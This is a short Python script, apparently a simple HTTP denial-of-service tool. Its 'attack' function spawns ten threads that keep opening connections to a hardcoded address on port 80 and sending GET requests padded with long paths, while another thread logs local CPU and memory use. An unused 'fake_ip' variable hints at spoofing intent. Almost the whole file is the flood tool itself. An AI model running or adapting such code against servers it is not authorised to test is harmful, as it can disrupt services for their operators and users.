import socket
import threading
import logging
import psutil
import time
import random


target="192.168.1.4"
port=80
trd=10
fake_ip="127.0.0.1"

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def attack(thread_id):
    """Sends a mock HTTP request to the target repeatedly."""
    count = 0  # Count the number of requests sent by each thread
    while True:
        try:
            # Create a socket and connect to the target
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)  # Set timeout to avoid hanging indefinitely
            s.connect((target, port))

            # Send data to simulate an HTTP GET request
            request = f"GET /{'A' * 500} HTTP/1.1\r\nHost: {target}\r\n\r\n"
            s.sendall(request.encode("utf-8"))

            # Log each request sent
            count += 1
            logging.info(f"Thread {thread_id} sent request {count}")

        except BrokenPipeError:
            logging.error(f"Thread {thread_id} encountered a BrokenPipeError")
        except socket.error as e:
            logging.error(f"Thread {thread_id} encountered a socket error: {e}")
        finally:
            s.close()  # Ensure the socket is closed

        # Random delay to avoid overwhelming the server
        time.sleep(random.uniform(0.5, 1.5))

def monitor_resources():
    "Monitors and logs CPU and Memory usage every second"
    while True:
        # Get CPU and Memory Usage
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_info = psutil.virtual_memory()

        # Log system resource usage
        logging.info(f"CPU Usage: {cpu_usage}% | Memory Usage: {memory_info.percent}%")
        time.sleep(1)  # Adjust the interval as needed



# Start resource monitoring in a separate thread
monitor_thread = threading.Thread(target=monitor_resources)
monitor_thread.daemon = True  # Daemonize to exit when main program ends
monitor_thread.start()


for i in range(trd):
    thread = threading.Thread(target=attack, args=(i,))
    thread.start()




